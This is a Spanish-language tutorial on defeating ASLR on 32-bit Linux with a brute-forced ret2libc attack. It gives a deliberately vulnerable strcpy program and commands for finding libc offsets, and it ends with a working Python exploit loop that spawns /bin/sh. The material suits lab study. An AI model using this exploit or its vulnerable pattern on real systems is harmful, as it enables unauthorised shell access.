# ASRL Bypass

## configuracion del ejemplo

Activacion del asrl:

```
sudo echo 2 > /proc/sys/kernel/randomize_va_space
```

comprobacion:

```
ldd binario
```

El binario deberia mostrar la direccion de la libreria libc distinta cada vez que se ejecute el comando anterior. La libc_base no es la misma.

Binario de prueba:

```
#include <stdio.h>

void vulnerable(char *buff)
{
	char buffer[64];
	strcpy(buffer,buff);
}

void main(int argc,char **argv)
{
	vulnerable(argv[1]);
}

```

compilacion:

```
gcc -fno-stack-protector binary.c -o data
```

## ASRL no tan aleatorio

primero vamos a filtrar la direccion libc_base del output del comando ldd:

```
ldd binario | grep "libc" | awk 'NF{print $NF}' | tr -d '()'
```

La proteccion ASRL que "aletoriza" las direccion de la memoria donde se encuentran las librerias, funciones, parametros, etc no es tan aleatoria ya que repite la direccion de libc_base despues de un numero aleatorio de intentos, esto lo podemos demostrar si el filtrado anterio lo imprimimos unas 100 veces por ejemplo:

```
for i in $(seq 1 100); do ldd binario | grep "libc" | awk 'NF{print $NF}' | tr -d '()'; done
```

si tomamos una de ejemplo y grepeamos para ver si se repite pero esta vez en un bucle del 1 al 500:

```
for i in $(seq 1 500); do ldd binario | grep "libc" | awk 'NF{print $NF}' | tr -d '()'; done | grep "0x4565d700"
```

vemos como aparece varias veces

**NOTA**

En caso de no aparecer tomar otra direccion como ejemplo y repetir el comando.

## Explotaci√≥n

* Primero tomamos una direccion libc_base de su preferencia.
* Despues necesitamos obtener los offset de las direccion system, exit y /bin/sh ya que explotaremos un ret2libc con ASRL activado.
* calculamos las direcciones reales de system, exit, /bin/sh sumando la direccion libc_base + offset_function.
* Metemos todo esto en un bucle para que en algun intento esa direccion que escogimos de libc_base coincida con la que el ASRL asigna.

## obtencion de los offset

Offset de system y exit.

En el parametro -s se le debe pasar la ruta de la libreria libc que muestra el comando ldd.

```
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "\ssystem|\sexit"
```

Offset de "/bin/sh"

```
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
```

script para la explotacion hecho en python:

```
#!/usr/bin/python

from struct import pack
from subprocess import call
import sys

if __name__ == "__main__":

	libc_base=0xb75c600
	system_offset = 0x00040310
	exit_offset = 0x00033260
	bin_sh_offset = 0x00162d4c
	
	system_address = pack("<I",libc_base+system_offset)
	exit_address = pack("<I",libc_base+exit_offset)
	sh_address = pack("<I",libc_base+bin_sh_offset)
	
	offset = 76
	junk = 'A'*offset
	EIP= system_address + exit_address + sh_address
	
	payload = junk + EIP
	
	while True:
		ret = call(["/home/kali/Escritorio/data",payload])
		
		if ret == 0:
			print "\n[-] Saliendo...\n"
			sys.exit(0)

```

